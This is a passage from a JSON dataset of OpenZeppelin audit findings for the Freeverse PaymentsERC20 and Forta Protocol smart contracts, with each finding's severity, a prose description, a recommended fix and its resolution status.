#1](https://github.com/freeverseio/PaymentsERC20Public/pull/1/commits/645f3f49e486c84f1dc96c9468ccdc72c485b402).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10572",
      "title": "Potential loss of access to funds if payment window is incorrectly set",
      "impact": "MEDIUM",
      "content": "The `_paymentWindow` variable within the `PaymentsERC20` contract stores the maximum amount of time allowed for an asset transfer to be completed once a payment starts. The default value is [30 days](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L55) and during this time, the buyer’s funds remain locked. If the buyer tries to obtain a refund before the payment window has expired, the [refund request will not be accepted](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L340).\n\n\nThe `PaymentsERC20` contract has a [`setPaymentWindow`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L65) function that allows the contract owner to adjust the payment window for future payments. This function does not impose a limit on the chosen window size, making it possible to set the value so high that obtaining a refund from an asset transfer that failed to complete would effectively be impossible.\n\n\nTo prevent potential loss of access to funds, within the `setPaymentWindow` function, consider adding an upper limit on the payment window duration that the function will accept.\n\n\n***Update:** Fixed as of [commit `a476fa1` of PR #3](https://github.com/freeverseio/PaymentsERC20Public/pull/3/commits/a476fa1f63495feccbcf8103a8e704abed301f26).*",
      "summary": "\nThis bug report is about the `PaymentsERC20` contract, which is part of the Freeverseio PaymentsERC20Public repository. The `_paymentWindow` variable within the contract stores the maximum amount of time allowed for an asset transfer to be completed once a payment starts. The default value is 30 days, and during this time, the buyer’s funds remain locked. If the buyer tries to obtain a refund before the payment window has expired, the refund request will not be accepted.\n\nThe `PaymentsERC20` contract has a `setPaymentWindow` function that allows the contract owner to adjust the payment window for future payments. This function does not impose a limit on the chosen window size, making it possible to set the value so high that obtaining a refund from an asset transfer that failed to complete would effectively be impossible. To prevent potential loss of access to funds, the bug report suggested adding an upper limit on the payment window duration that the `setPaymentWindow` function will accept. The bug was fixed with commit `a476fa1` of PR #3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10571",
      "title": "Operators are implicitly trusted",
      "impact": "HIGH",
      "content": "In the current design of the payment system, the operator role wields a significant amount of power. A buyer cannot initiate a payment without the approval of an operator, and a seller must rely on an operator to vouch for the transfer of their asset. Operators are implicitly trusted to be good actors in the system. However, there are four possible scenarios where operators could behave maliciously:\n\n\n* *Operator as a buyer*: Both the buyer and operator need to agree upon the `PaymentInput` data. But there’s nothing restricting an operator from also acting as a buyer, in which case they can approve their own transactions. More importantly, acting as a buyer an operator could defraud a seller by obtaining a refund even though the asset was received. After the seller’s asset is transferred, the operator could either create a signed `AssetTransferResult` with the `wasSuccessful` field set to `false`, or not sign an `AssetTransferResult` at all. The operator could then call [`refund`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L183) or [`refundAndWithdraw`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L188) after the payment window has expired, and obtain their full payment amount even though the seller’s item was successfully transferred.\n* *Operator as a seller*: The contracts do not restrict an operator from also being a seller in a transaction they are responsible for monitoring. In this case, an operator could register as a seller and post an item for sale. After a buyer initiates payment, the operator could craft an `AssetTransferResult` with the `wasSuccessful` field set to `true`, but then choose not to transfer the asset. The operator could then call [`finalize`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L166) or [`finalizeAndWithdraw`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L174) with the signed `AssetTransferResult`, prior to the payment window expiring, thus receiving payment for an asset that was never delivered.\n* *Operator colluding with a buyer*: Similar to the case where the operator and the buyer are the same, an operator could work together with a buyer in an attempt to obtain a refund for a transferred asset. As before, the operator could create a signed `AssetTransferResult` with `wasSuccessful` set to `false`, even though the asset was transferred.\n* *Operator colluding with a seller*: Similar to the case where the operator and the seller are the same, an operator could work in conjunction with a seller who owns an item of value. As before, the operator would create a signed `AssetTransferResult` with `wasSuccessful` set to `true`, even though the seller did not transfer the asset.\n\n\nAn operator should always be an observer of transactions and never participate as a buyer or seller. To prevent misuse of the power granted to an operator, consider adding checks which ensure that the `buyer` and `seller` addresses in the [`PaymentInput`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IEIP712Verifier.sol#L15) struct can never be the same as the `operator` address for the same payment transaction. Also consider revisiting the trust assumptions that allow an operator entity to independently vouch for the success or failure of an asset transfer via the `AssetTransferResult` mechanism, and how the system can guarantee that an asset transfer result is always produced.\n\n\n***Update:** Not an issue. After discussing with the Freeverse team, we have concluded that the system is designed with a trust assumption that the role of operator will always be in the favor of the system. Additionally, the team has applied the fixes in the codebase to ensure that an operator cannot be a buyer or a seller, this is fixed as of [commit `714e99e` of PR #2](https://github.com/freeverseio/PaymentsERC20Public/pull/2/commits/714e99efb5e5bb17e7cc7b569ddcbbfdb422f517).*",
      "summary": "\nThe bug report focuses on the misuse of power by an operator in the current design of the payment system. An operator is implicitly trusted to be a good actor in the system, but there are four scenarios where they could behave maliciously. Firstly, an operator could act as a buyer and defraud a seller by obtaining a refund even though the asset was received. Secondly, an operator could act as a seller and receive payment for an asset that was never delivered. Thirdly, an operator could collude with a buyer to obtain a refund for a transferred asset. Lastly, an operator could collude with a seller who owns an item of value. \n\nTo prevent misuse of power by an operator, checks should be added which ensure that the buyer and seller addresses in the PaymentInput struct can never be the same as the operator address for the same payment transaction. Additionally, trust assumptions should be revisited that allow an operator entity to independently vouch for the success or failure of an asset transfer via the AssetTransferResult mechanism.\n\nAfter discussing with the Freeverse team, it was concluded that the system is designed with a trust assumption that the role of operator will always be in the favor of the system. Fixes were applied in the codebase to ensure that an operator cannot be a buyer or a seller, this is fixed as of commit 714e99e of PR #2.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10603",
      "title": "Reentrancy possibility due to _doSafeTransferAcceptanceCheck",
      "impact": "LOW",
      "content": "After calling the [`_mint` function in the `FortaStaking` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L213), the function [`_doSafeTransferAcceptanceCheck`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/fd165faaf00587377b5ab93be3cafb4ffdc96976/contracts/token/ERC1155/ERC1155Upgradeable.sol#L282) from the `ERC1155Upgradeable` contract will get called, which [will hand over control to the `to` address](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/fd165faaf00587377b5ab93be3cafb4ffdc96976/contracts/token/ERC1155/ERC1155Upgradeable.sol#L451).\n\n\nThis does not happen similarly for the `_burn` function because the `to` address would be the `address(0)`. In the `FortaStaking` contract, the [`deposit`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L213) and [`initiateWithdrawal`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L242) functions both make a call to the `_mint` function followed by a call to the `emitHook` function. The `emitHook` calls are currently undefined for these functions, but if they rely on calling into the Forta contracts to access certain variables, for example, then a malicious user may be able to affect these variables in unexpected ways.\n\n\nWhen developing Forta, specifically the “hook” calls, developers should consider the fact that arbitrary code may be executed in the frame of the `_mint` function call. Since more control exists for the hooks, consider moving the call to the `_emitHook` function prior to the `_mint` function call in these indicated cases. Additionally, consider forwarding relevant data in the `_emitHook` function calls as it is needed (such as balances or ERC1155 tokens, or total supply) so that if they are tampered with in the context of the `_mint` function call they will not affect the `_emitHook` function call.\n\n\n***Update:** Fixed on [commit `0d91a544de1540459b71167dfdf318bb11acf6a6` in pull request 76](https://github.com/forta-protocol/forta-token/pull/76/commits/0d91a544de1540459b71167dfdf318bb11acf6a6). Some hooks have been removed until an implementation makes use of them.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10602",
      "title": "Deviation from specifications",
      "impact": "LOW",
      "content": "The [`StakingEscrow` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L18) implements the functionality to allow users who have vested tokens in L1 to be able to interact, participate, and stake those assets in the protocol. By doing so, the protocol could disburse rewards to users which would be collectable by calling the [`release` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L118), where the [documentation states](https://app.diagrams.net/#G1TTjUyMn7rPYkztKp2NhEQczIkT4K3FK4) that even if these assets are sent to a non-whitelisted address, the tokens will arrive but those will get stuck.\n\n\nHowever, due to the [`_beforeTokenTransfer` function hook](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/token/FortaCommon.sol#L35) being called during any regular transfer of ERC20 tokens, it [will not be possible](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/token/FortaCommon.sol#L37) to send those assets to a non-whitelisted address.\n\n\nConsider either updating the documentation to reflect the current behavior of the protocol or fixing the implementation to follow the specifications.\n\n\n***Update:** Fixed. Now the [documentation](https://drive.google.com/file/d/1TTjUyMn7rPYkztKp2NhEQczIkT4K3FK4/view) reflects what it is implemented in the code.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10601",
      "title": "Semantic overload",
      "impact": "LOW",
      "content": "The [`ScannerRegistryEnable` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L9) implements the functionality for enabling and disabling scanners, but it also [extends the functionality of the registration process](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L36).\n\n\nWhen registering a new scanner, the contract [checks if the minimum stake for the scanner type is greater than zero](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L37). This value is changed by the admin in the [`FortaStaking` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L504) and it is meant to define a threshold value instead of an enabled status.\n\n\nThis is known as [Semantic Overload](https://forum.openzeppelin.com/t/watch-out-for-semantic-overloading/1088). If the multiple meanings of the variables and states are not totally clear when making changes to the code, it can introduce severe vulnerabilities. We strongly discourage its usage if possible.\n\n\nConsider explicitly setting independent flags to represent the state of the scanners instead of using the same variable for different purposes.\n\n\n***Update:** Fixed on [commit `1869a5ab8461c106e283a2d23e857d8435a8587b` in pull request 78](https://github.com/forta-protocol/forta-token/pull/78/commits/1869a5ab8461c106e283a2d23e857d8435a8587b). Now, the [scanner registration process checks](https://github.com/forta-protocol/forta-token/blob/27f795ef4748d460462f564427f17deebbada21a/contracts/components/scanners/ScannerRegistryCore.sol#L33) if a certain chain is activated by using an explicit flag.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10600",
      "title": "Non-registered scanners default to non-disabled states",
      "impact": "LOW",
      "content": "The [`ScannerRegistryEnable` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L9) implements the functionality for enabling and disabling scanners, among other actions, and it uses bit maps to keep track of their states.\n\n\nHowever, when [enabling a scanner](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L65), the [`_scannerEnable` internal function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L85) uses the inverse assignment, meaning that a `1` flag accounts as a disabled state and a `0` state as an enabled one. Although this will not be sufficient to mark a random scanner ID as enabled, as it must be [registered as a ERC721](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L31) and have [enough stake on top of it](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L33), its default un-registered behavior resembles a non-disabled scanner.\n\n\nEven though this does not possess a security risk per se, in order to improve the readability of the code and reduce the attack surface, consider using a different state from the default one when enabling new scanners.\n\n\n***Update:** Acknowledged, will not fix. Forta team’s statement for this issue:*\n\n\n\n> It is true that the logic is inverted, and in a chain without min stake, an Agent/Scanner will be enabled (not disabled) on creation. This is acceptable to us because of several reasons: Registries are deployed in production, so we can’t invert the logic of `_disableFlags` without downtime. `_disableFlag` at 1 does not just mean disabled, it is the permission of the wallet that disabled the scanner (`uint8`, or rather `Permission` enum) so having a value that means “scanner registered the first time but not enabled yet” might complicate things further.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10599",
      "title": "Magic numbers are used",
      "impact": "LOW",
      "content": "Throughout the codebase, there are occurrences of literal values with unexplained meaning. For example, the operation to get the [maximum slashable stake](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L296) in the `FortaStaking` contract uses explicit numbers during the calculation without documenting the reasons of such values.\n\n\nTo improve the code’s readability and facilitate refactoring, consider defining a constant for every magic number, giving it a clear and self-explanatory name. For complex values, consider adding an inline comment explaining how they were calculated or why they were chosen.\n\n\n***Update:** Fixed on [commit `802b183505f637d1f4ec97a64b2c8b3d58057096` in pull request 60](https://github.com/forta-protocol/forta-token/pull/60/commits/802b183505f637d1f4ec97a64b2c8b3d58057096).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10598",
      "title": "Disabled scanners and agents may appear to be linked",
      "impact": "LOW",
      "content": "Within `Dispatch.sol`, the mappings [`scannerToAgents`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/dispatch/Dispatch.sol#L18) and [`agentToScanners`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/dispatch/Dispatch.sol#L19) should store correct linkages between agents and scanners.\n\n\nIf an agent or scanner is disabled, they are [not allowed to be `link`ed](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/dispatch/Dispatch.sol#L74-L75). Thus, it follows that if scanners or agents which are `link`ed are then disabled, the `link` should be removed. However, this is not enforced – a scanner or agent may be disabled, but the values in `scannerToAgents` and `agentsToScanners` may not reflect this.\n\n\nConsider adding a programmatical way to remove `link`s whenever an agent or scanner is disabled. Consider that, since a single agent or scanner may have multiple instances it is linked to, the `unlink`ing process may involve calling `unlink` multiple times. This may mean adding a limit to the number of links for a single instance. Alternatively, consider documenting this behavior clearly for any 3rd-party developers, and encouraging them to double-check that both the scanner and agent are enabled when querying linked pairs.\n\n\n***Update:** Acknowledge, but will not fix. The Forta team’s statement for the issue:*\n\n\n\n> *Product requirements not clear yet, addressed in the conversation thread but we will not take action yet (since assigner software is doing that labor now).*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10597",
      "title": "Incomplete interfaces",
      "impact": "LOW",
      "content": "The [`IRouter` interface](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/IRouter.sol#L4) should have an externally accessed function which is not being declared in the interface, the [`version` getter function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L19).\n\n\nConsider declaring all externally accessed functions without access control so users and developers can make use of interfaces when using the protocol.\n\n\n***Update:** Fixed on [commit `a1f8eee474259c7b408932a7abc567116859c106` in pull request 74](https://github.com/forta-protocol/forta-token/pull/74/commits/a1f8eee474259c7b408932a7abc567116859c106). Versioned contracts now inherit from the `IVersioned` interface which declares the getter.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10596",
      "title": "Implicit casting",
      "impact": "LOW",
      "content": "Throughout the codebase, an instance of implicit casting between types has been detected.\n\n\nIn the [`FortaStakingUtils` library](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStakingUtils.sol#L4), in lines [10](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStakingUtils.sol#L10) and [18](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStakingUtils.sol#L18), the `subjectType` `uint8` parameter is being used in a bitwise `OR` operation against a `uint256` result.\n\n\nWhenever a different type of variable is needed, consider either checking and casting the variable into the desired type or using OpenZeppelin’s [`SafeCast` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.4.2/contracts/utils/math/SafeCast.sol) which provides overflow checking when casting from one type of number to another.\n\n\n***Update:** Fixed on [commit `2ff21729d1daeb06d830b8a239dcb8d9fd7b9dfd` in pull request 59](https://github.com/forta-protocol/forta-token/pull/59/commits/2ff21729d1daeb06d830b8a239dcb8d9fd7b9dfd).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10595",
      "title": "Implement a remove-whitelist functionality",
      "impact": "LOW",
      "content": "Currently, to prevent tokens from being transferred while within the vesting schedule, a [`WHITELIST_ROLE` is defined and checked in `FortaCommon._beforeTokenTransfer`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/token/FortaCommon.sol#L36-L37). The user or contract can only transfer tokens if “whitelisted”. Eventually, the whitelist requirement is planned to be removed via a contract upgrade.\n\n\nSince contract upgrades are notoriously risky due to storage slot assignment issues, and since the removal of the whitelist functionality is planned for future development, consider implementing an access controlled “remove whitelist” functionality in the existing contract which disables the whitelist. This will also give users greater confidence about the future state of the system and allow development which may depend on the future system design to proceed more smoothly.\n\n\n***Update:** Fixed on [commit `dd558f1017eee429e8d66d9d151de3adf1d02a6d` in pull request 58](https://github.com/forta-protocol/forta-token/pull/58/commits/dd558f1017eee429e8d66d9d151de3adf1d02a6d).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10594",
      "title": "Potential for hash collisions with frontrun protection",
      "impact": "LOW",
      "content": "Within `AgentRegistryCore.sol`, calls to the [`frontrunProtected` modifier](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L38) utilize `abi.encodePacked` to create a “unique” hash of some commited data.\n\n\nHowever, by using two dynamic parameters next to each other (both in [`createAgent`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L38) and in [`updateAgent`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L54)), hashes can be easily forged simply by adjusting `metadata` and `chainIds`, such that an agent may be created or updated incorrectly.\n\n\nBy simply using `abi.encode` rather than `abi.encodePacked`, such collisions from dynamic parameters being adjacent can be avoided. Consider using `abi.encode` here instead.\n\n\n***Update:** Fixed on [commit `2a7391dff896384174ca49ff960d889120961a4e` in pull request 57](https://github.com/forta-protocol/forta-token/pull/57/commits/2a7391dff896384174ca49ff960d889120961a4e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10593",
      "title": "Inconsistent slot size for upgrades",
      "impact": "LOW",
      "content": "Throughout the whole codebase, several contracts are allowed to be upgradable in order to improve/extend the functionalities or to fix a vulnerability. To mitigate the possibility of having a storage collision, those contracts define an array at the bottom of the contract that its length added to the number of variables defined in the contract adds to a fix number, usually 50.\n\n\nHowever, there are contracts in which the sum is not consistent with the rest of the codebase. In particular:\n\n\n* The [`ScannerRegistryManaged` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L44) whose sum adds up to 45.\n* The [`StakeAwareUpgradeable` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/StakeAware.sol#L40) whose sum adds up to 5.\n* The [`AgentRegistryCore` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L83) whose sum adds up to 45.\n\n\nIn order to improve the code’s readability, prevent future storage collisions on contracts that may have less storage slots available, and to be consistent with the rest of the code, consider fixing all the respective places where the sum does not add up to a common fixed number. Furthermore, consider documenting as in-line comments all the variables that took one of those places as documentation for the `__gap` variable as an exercise to double corroborate its final length.\n\n\n***Update:** Fixed in [pull request 45](https://github.com/forta-protocol/forta-token/pull/45) and on [commit `4a49ba4bdc53702fe199d06d249a0e961ee8385b` in pull request 77](https://github.com/forta-protocol/forta-token/pull/77/commits/4a49ba4bdc53702fe199d06d249a0e961ee8385b). The team has [explicitly described](https://github.com/forta-protocol/forta-token/pull/77#issue-1141608847) the slot usages in those files and added upgradeability information in the `README.md` file to mitigate future problems.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10592",
      "title": "Add information in _emitHook calls",
      "impact": "LOW",
      "content": "Within the `FortaStaking` contract, there are many calls to the [`_emitHook` function for the hook `hook_afterStakeChanged`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L215). However, this hook only includes two parameters: `subjectType` and `subject`. Note that identical calls are made in the [`deposit`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L215), [`initiateWithdrawal`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L246), [`withdraw`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L276), and the [`slash`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L309) functions.\n\n\nIf it is eventually needed to determine which user triggered a stake change, which user’s stake has changed, by how much a stake has changed, or what function resulted in the stake change, a call into the `FortaStaking` contract will be needed, possibly alongside complex logic in an external contract.\n\n\nConsider passing relevant data with the calls to `_emitHook`, such as `_msgSender` and `changeInStake`. Doing so will make it easier for the contract receiving the hook to interpret what has happened. Additionally, consider documenting the purposes of the hooks for future development, so it is clear exactly which data may be needed from the `hook_afterStakeChanged` call.\n\n\n***Update:** Fixed on [commit `0d91a544de1540459b71167dfdf318bb11acf6a6` in pull request 76](https://github.com/forta-protocol/forta-token/pull/76/commits/0d91a544de1540459b71167dfdf318bb11acf6a6).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10591",
      "title": "TODOs and comments implying unfinished code",
      "impact": "LOW",
      "content": "There are “TODO” comments and other comments implying unfinished codes in the codebase. These should be tracked in the project’s issues backlog. In particular:\n\n\n* [Line 38 of `AgentRegistryCore.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L38).\n* [Line 54 of `AgentRegistryCore.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L54).\n* [Line 35 of `Router.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L35), which seems to imply the development effort here is unfinished.\n\n\nDuring development, having well described “TODO” comments will make the process of tracking and solving them easier. Without that information, these comments might tend to rot and important information for the security of the system might be forgotten by the time it is released to production.\n\n\nThese TODO comments should at least have a brief description of the task pending to do, and a link to the corresponding issue in the project repository.\n\n\nConsider updating these comments to add this information. For completeness and traceability, a signature and a timestamp can be added.\n\n\n***Update:** Fixed on [commit `d02065f071cd94d1361e00ff2b5208f71d76d014` in pull request 73](https://github.com/forta-protocol/forta-token/pull/73/commits/d02065f071cd94d1361e00ff2b5208f71d76d014) and on [commit `1f19717cc711522afb05299c8c3e05238484de0d` in pull request 75](https://github.com/forta-protocol/forta-token/pull/75/commits/1f19717cc711522afb05299c8c3e05238484de0d). However, now the `AGENT_ADMIN_ROLE` role can ban any creation by frontrunning the sender’s transaction and changing the `frontRunningDelay` variable.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10590",
      "title": "Slashing process could be reverted",
      "impact": "MEDIUM",
